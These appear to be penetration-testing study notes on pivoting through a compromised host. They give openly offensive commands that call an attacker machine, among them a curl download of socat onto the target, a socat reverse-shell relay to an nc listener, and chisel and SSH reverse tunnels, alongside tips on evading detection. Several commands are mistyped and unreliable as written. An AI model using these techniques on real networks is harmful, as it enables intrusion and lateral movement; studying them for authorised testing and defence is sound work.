# Pivoting

**Pivoting**: using access obtained over one machine to exploit another machine deeper into the network.

Two main methods:
- **Tunnelling/Proxying**: Create a proxy-type connection through a compromised machine to route all desired traffic into the target network.
	- Can be *tunnelled* through another protocol (e.g., SSH tunnelling) which can evade **I**ntrusion **D**etection **S**ystems (**IDS**) or firewalls.
	- Good for redirecting different kinds of traffic to target network (e.g., nmap scan or to access multiple ports on multiple machines)
- **Port Forwarding**: Create a connection between a local port and a single port on a target, via a compromised host.
	- Faster and more reliable but only allows access to a single port (or small range) on a target

## Enumeration

Five ways to enumerate:
1. Using information on the machine (e.g., hosts file or ARP cache)
2. Using preinstalled tools
3. Using statically compiled tools
4. Using scripting techniques
5. Using local tools through a proxy (**last resort**)

###### Information on Machine

The `arp -a` command can be used on Windows and Linux to check the ARP cache of the machine - the IP addresses of any hosts the target has interacted with.

```console
$ arp -a
```

Static mappings can be found in `/etc/hosts` (Linux) and `C:\Windows\System32\drivers\etc\host`.

The `/etc/resolv.conf` file (Linux) can also be used to identify local DNS servers - may be misconfigured allowing for a DNS zone transfer attack.  This can also be read by executing `nmcli dev show`.  On Windows, DNS servers can be checked with `ipconfig /all`.

###### Preinstalled Tools

###### Statically Compiled Tools

*Static* binaries refer to programs that do not requier external libraries (i.e., they are built into the final executable) - unlike *dynamic* programs which depend on `.so` files (Linux) and `.dll` files (Windows) in order to execute.

###### Scripting Techniques

Ping sweep one-liner:

```console
# This will perform a ping sweep of the 192.168.1.x network
$ for i in {1..255}; do (ping -c 192.168.1.${i} | grep "bytes from" &); done
```

## Methods

#### ProxyChains

**Proxychains** can be used to allow us to connect to the target network by opening a port on our attacker machine which is linked to the compromised machine.  Example usage is as follows:

```console
$ proxychains nc 172.16.0.10 23
```

As shown above, the proxy port is not specified as it resides in a `proxychains.conf` file, which can be in one of three directories:

1. Current directory (`./proxychains.conf`)
2. Home directory (`~/.proxychains/proxychains.conf`)
3. Default installation directory (`/etc/proxychains.conf`)

Specifically, in this file, the `[ProxyList]` can be modified to set the local proxy port:

```
[ProxyList]
# add proxy here ...
# meanwhile
# defaults set to "tor"
socks4  127.0.0.1 9050
```

The proxy DNS settings can also be modified:

```
# Proxy DNS requests - no leak for DNS data
proxy_dns
```

This line can be commented out if performing a scan through the proxy - prevents the scan from hanging and ultimately crashing.

Also note:
- **TCP scans only** - no UDP/SYN scans and ICMP echo packets (ping requests) will not work via proxy (use `-Pn` with nmap)
- **Slow**: only use nmap through proxy when using NSE

#### FoxyProxy

**FoxyProxy** can also be used when working from a web browser - available for [Firefox](https://addons.mozilla.org/en-GB/firefox/addon/foxyproxy-basic/) and [Chrome](https://chrome.google.com/webstore/detail/foxyproxy-basic/dookpfaalaaappcdneeahomimbllocnb).

Once configured and activated, all browser traffic will be redirected through a chosen port.

#### SSH Tunnelling

It is possible to create a forward SSH tunnel when there is SSH access on the target.  This is commonly enabled on Unix hosts, but Microsoft also have an SSH implementation native to Windows.

One way of accomplishing this is **port forwarding**:

```console
# -L denotes a link to a local port
# E.g., if we have access to 172.16.0.5 and there is a webserver running
# on 172.16.0.10, we can create a link to 172.16.0.10
$ ssh -L 8000:172.16.0.10:80 user@172.16.0.5 -fN
```

From the above, command, we can then access the website on `172.16.0.10` (through `172.16.0.5`) by navigating to port `8000` on our machine. The `-f` option backgrounds the shell and `-N` tells SSH not to execute any commands, just to set up the connection.

Another way is via **proxies**:

```console
# Opens up port 1337 on attacker machine as a proxy to send data through 
# the protected network
$ ssh -D 1337 user@172.16.0.5 -fN
```

As above, the port (in this case `1337`) needs to be setup within the proxychains configuration file in order to route all of the traffic into the target network.

###### Reverse Connection

**Reverse connections** are also easily configured via SSH, although can be risky as you inherently must access your attacking machine **from** the target.  To do this, follow the steps below:

```console
# 1) generate set of SSH keys
$ ssh-keygen

# 2) copy contents of public key (.pub) and edit ~/.ssh/authorized_keys
#    on attacker machine
# 3) enter the following, and paste in the public key

command="echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-x11-forwarding,no-pty

# 4) start the SSH service on attacker machine
$ sudo systemctl start ssh

# 5) transfer the private key to the target box

# 6) connect back with reverse port forward
$ ssh -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -fN

# (optional)
# it can be possible to create a reverse proxy in newer SSH client versions
$ ssh -R 1337 USERNAME@ATTACKING_IP -i KEYFILE -fN
```

To close any connections, type:

```console
$ ps aux | grep ssh
```

Find the process ID (PID) of the connection and use `sudo kill PID` to close the connection.

#### plink.exe

**plink.exe** is a Windows command-line version of PuTTY.  Generally, Windows servers are unlikely to have SSH access to plink is used to transfer binaries to the target and then create a reverse connection.

```console
> cmd.exe /c echo y | .\plink,exe LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -N
```

`cmd.exe /c echo y` is for non-interactive shells

E.g., if we have access to `172.16.0.5` and want to forward a connection to `172.16.0.10:80` back to port `8000` on our attacking machine (`172.16.0.20`):

```console
> cmd.exe /c echo y | .\plink.exe -R 8000:172.16.0.10:80 kali@172.16.0.20 -i KEYFILE -N
```

Note, keys generated via `ssh-keygen` will not work as they must be converted:

```console
> puttygen KEYFILE -o OUTPUT_KEY.ppk
```

The `.ppk` file can then be transferred to the Windows target via reverse port forwarding

#### Socat

Socat can also be used for port forwarding as well as stabilising shells.  However, it is rarely installed on a target, but static binaries can be found for [Linux](https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat) and [Windows](https://sourceforge.net/projects/unix-utils/files/socat/1.7.3.2/socat-1.7.3.2-1-x86_64.zip/download).  Socat can also be used as a relay if you cannot get a connection directly from a compromised machine.

First, a binary must be uploaded to the compromised machine if not already installed:

```console
# on the attacker machine:
$ sudo python3 -m http.server 80

# on the target:
$ curl ATTACKING_IP/socat -o /tmp/socat-USERNAME && chmod +x /tmp/socat-USERNAME
```

###### Reverse Shell Relay

Here, socat creates a relay to send a reverse shell back to the attacker machine:

```console
# attacker machine
$ sudo nc -lvnp 443

# target machine
$ ./socat tcp-l:8000 tcp:ATTACKING_IP:443 &
```

The above creates a reverse shell to the newly opened port `8000` on the target machine and attempts to connect to the attacker machine via port `443`.

###### Port Forwarding (Easy)

Socat can also be used for port forwarding.  For example, if the target is `172.16.0.5` and the target port is `3306` of `172.16.0.10`, then:

```console
$ ./socat tcp-l:33060,fork,reuseaddr tcp:172.16.0.3306 &
```

The above opens port `33060` on the target and redirects the input from the attacker's machine straight to the target server (`172.16.0.10`).  The `fork` option is used to put every connection to a new proces and `reuseaddr` means that the port stays open after a connection is made.  The latter can allow multiple connections via the same port.  As such, we can now connect to port `33060` on the relay `172.16.0.5` and have our connection reach the target `172.16.0.10:3306`.

###### Port Forwarding (Quiet)

Since the above opens a port on the compromised server, it may be visible to host/network scanning.  We can use socat in a more discreet fashion:

```console
# attacker machine
# opens ports 8000 and 8001 creating a local port relay (what goes into one
# will come out the other, hence fork/reuseaddr)
$ socat tcp-l:8001 tcp-l:8000,fork,reuseaddr &

# compromised relay server:
# makes connection on our listening port 8001 and the port of target server
$ ./socat tcp:ATTACKING_IP:8001 tcp:TARGET_IP:TARGET_PORT,fork &
```

For example from our compromised relay server `172.16.0.5` to our attacker machine `10.50.73.2` and our intended target `172.16.0.10`:

```console
# compromised relay server:
$ ./socat tcp:10.50.73.2:8001 tcp:172.16.0.10:80,fork &

# creates link between port 8000 on attacker machine and port 80 on intended target (172.16.0.10), meaning we can go to localhost:8000 to load webpage served by 172.16.0.10:80
```

In summary:
- The request goes to `127.0.0.1:8000`
- Due to socat listener on attacker machine, anything that goes through port `8000` comes out of port `8001`
- Port `8001` is directly connected to socat on the compromised server (anything that comes out of `8001` gets sent to the compromised server) where it gets relayed to port `80` on the target server
- Process is reversed when target sends response

#### Chisel

Similarly, [Chisel](https://github.com/jpillora/chisel) can also be used to set up tunnelled proxies or port forward through compromised systems - regardless of whether you have SSH access or not.  For this to work, you must have a chisel binary on both the attacking machine and the compromised server - you can use `scp` for the transfer:

```console
$ scp -i key chisel user@target:/tmp/chisel-USERNAME
```

Chisel has two modes: **client** and **server**.

###### Reverse SOCKS Proxy

This will connect *back* from a compromised server to a listener on our attacking machine:

```console
# attacker machine
$ ./chisel server -p LISTEN_PORT --reverse &

# compromised host
$ ./chisel client ATTACKING_IP:LISTEN_PORT R:socks &
```

Note, `R:socks` means "remote" which tells chisel client that the server anticipates the proxy/port forward to be made at the client side.

###### Forward SOCKS Proxy

Generally, egress firewalls (handling outbound traffic) are less stringent than ingress firewalls (handling inbound connections).  The syntax for this is as follows:

```console
# attacker machine
$ ./chisel client TARGET_IP:LISTEN_PORT PROXY_PORT:socks

# compromised host
$ ./chisel server -p LISTEN_PORT --socks5
```

For example, `./chisel client 172.16.0.10:8080 1337:socks` would connect to a chisel server running on port `8080` of `172.16.0.10`.  A SOCKS proxy would also be opened on port `1337` on our attacker machine.

Note that chisel uses a `SOCKS5` proxy, so this must be reflected in the proxychains configuration file.

###### Remote Port Forward

Here, we connect back from a compromised host to create the forward:

```console
# attacker machine
./chisel server -p LISTEN_PORT --reverse &

# compromised host
./chisel client ATTACKING_IP:LISTEN_PORT R:LOCAL_PORT:TARGET_IP:TARGET_PORT &
```

Here, the `LISTEN_PORT` is the port we start the chisel server on and `LOCAL_PORT` is the prot we wish to open on our attacker machine to link with the desired target port.

For example, assuming our IP is `172.16.0.20`, the compromised host's IP is `172.16.0.5` and our target is port `22` on `172.16.0.10`.  To forward `172.16.0.10:22` to port `2222` on our attacker machine:

```console
# attacker machine
$ ./chisel server -p 1337 --reverse &

# compromised host
$ ./chisel client 172.16.0.20:1337 R:2222:172.16.0.10:22 &
```

This would give us access to `172.16.0.10:22` via SSH by going to `127.0.0.1:2222`

###### Local Port Forward

Here we connect from our own attacking machine to the chisel server listening on a compromised host:

```
# attacker machine
./chisel client LISTEN_IP:LISTEN_PORT LOCAL_PORT:TARGET_IP:TARGET_PORT

# compromised host
./chisel server -p LISTEN_PORT
```

For example, to connect to `172.16.0.5:8000` (compromised host), forwarding our local port `2222` to `172.16.0.10:22` (intended target), we could use:

```
# attacker machine
./chisel client 172.16.0.5:8000 2222:172.16.0.10:22
```

#### sshuttle

[sshuttle](https://github.com/sshuttle/sshuttle) is a tool that creates a tunnelled proxy which acts like a new interface by using an SSH connection.  This means that it simulates a VPN, allowing us to route our traffic through the proxy **without** the need for proxychains.  In particular, we can directly connect to devices within the target network as we would normally, and communication is encrypted due to SSH.

To install, use `apt`:

```console
$ sudo apt install sshuttle
```

###### Connecting to a Server (with credentials)

```console
$ sshuttle -r username@address subnet
```

For example, for a fictional network `172.16.0.x` with a compromised server at `172.16.0.5`:

```console
$ sshuttle -r user@172.16.0.5 172.16.0.0/24
```

We would then be asked to enter the user's credentials in order for the proxy to be established.

###### Connecting to a Server (without credentials)

If we don't have the user's password, or the server only accepts key-based authentication, we can use the `--ssh-cmd` option as a bypass.  This allows us to use a keyfile for authentication:

```
$ sshuttle -r user@address --ssh-cmd "ssh -i KEYFILE" SUBNET

# compromised server at 172.16.0.5 on 172.16.0.0/24 subnet
$ sshuttle -r user@172.16.0.5 --ssh-cmd "ssh -i private_key" 172.16.0.0/24
```

###### Broken Pipe Error

```
client: Connected.
client_loop: send disconnect: Broken pipe
client: fatal: server died with error code 255
```

The above error may occur when the compromised machine you're trying to connect to is part of the subnet you're attempting to gain access to.  For example, `172.16.0.5` is part of the `172.16.0.0/24` subnet and therefore must be excluded from the subnet range:

```console
$ sshuttle -r user@172.16.0.5 172.16.0.0/24 -x 172.16.0.5
```